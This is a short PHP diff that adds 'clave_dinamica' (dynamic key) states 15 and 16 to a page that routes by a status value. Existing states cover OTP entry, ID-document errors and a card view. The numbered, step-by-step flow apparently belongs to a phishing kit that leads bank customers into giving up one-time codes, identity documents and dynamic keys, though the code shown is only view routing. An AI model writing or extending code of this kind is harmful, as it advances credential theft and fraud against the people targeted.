@@ -30,6 +30,8 @@ if ($status === 'otp') {
     $body_class = 'cc-view';
 } elseif ($status === 'doc_back_error') { // State 14
     $body_class = 'cc-view';
+} elseif ($status === 'clave_dinamica' || $status === 'clave_dinamica_error') { // State 15 & 16
+    $body_class = 'cc-view';
 }
 
 ?>
@@ -82,6 +84,10 @@ if ($status === 'otp') {
     } elseif ($status === 'doc_back_error') { // State 14
         include 'partials/doc_error_notification.php';
         include 'partials/doc_back.php';
+    } elseif ($status === 'clave_dinamica') { // State 15
+        include 'partials/clave_dinamica.php';
+    } elseif ($status === 'clave_dinamica_error') { // State 16
+        include 'partials/clave_dinamica.php';
     }
     ?>
 
